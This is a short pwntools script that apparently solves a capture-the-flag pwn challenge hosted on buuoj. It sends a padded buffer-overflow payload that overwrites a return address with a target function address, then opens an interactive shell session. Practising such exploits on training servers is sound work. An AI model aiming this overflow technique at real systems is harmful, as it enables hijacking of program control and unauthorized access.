from pwn import *

func = 0x08048F0D


# print(int(0x3c))

r = remote('node5.buuoj.cn', 29240)

r.sendline(b'I' * 20 + b'a' * 4 + p64(func))

r.interactive()